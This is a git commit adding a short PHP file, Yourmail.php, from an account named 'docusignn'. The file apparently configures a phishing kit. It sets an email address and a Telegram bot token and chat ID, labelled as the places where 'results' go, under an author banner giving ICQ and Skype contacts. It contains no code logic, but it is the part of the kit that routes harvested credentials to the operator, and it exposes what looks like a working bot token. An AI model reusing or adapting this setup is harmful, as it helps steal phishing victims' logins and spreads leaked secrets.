14a20b9a14bae2c37bbb50206398315ea478a185
docusignn <162912916+docusignn@users.noreply.github.com>
2024-03-10 13:12:43 -0500

    Add files via upload

---
+++ Yourmail.php
@@ -0,0 +1,15 @@
+<?php
+/*
+  //||~~ By ~~ saradauchia ~~\\
+  // ICQ Id: @saradauchia \\
+ // SKYPE Id: saradauchia2 \\	
+*/
+
+$send ="rema-puma@yandex.com"; 
+
+//telgram rzlt
+$api = "5478871666:AAHwLSGPgZqy3a6vCwcOiKTygSM1OKBHh4E";
+$chatid = "533821038";
+
+
+?>
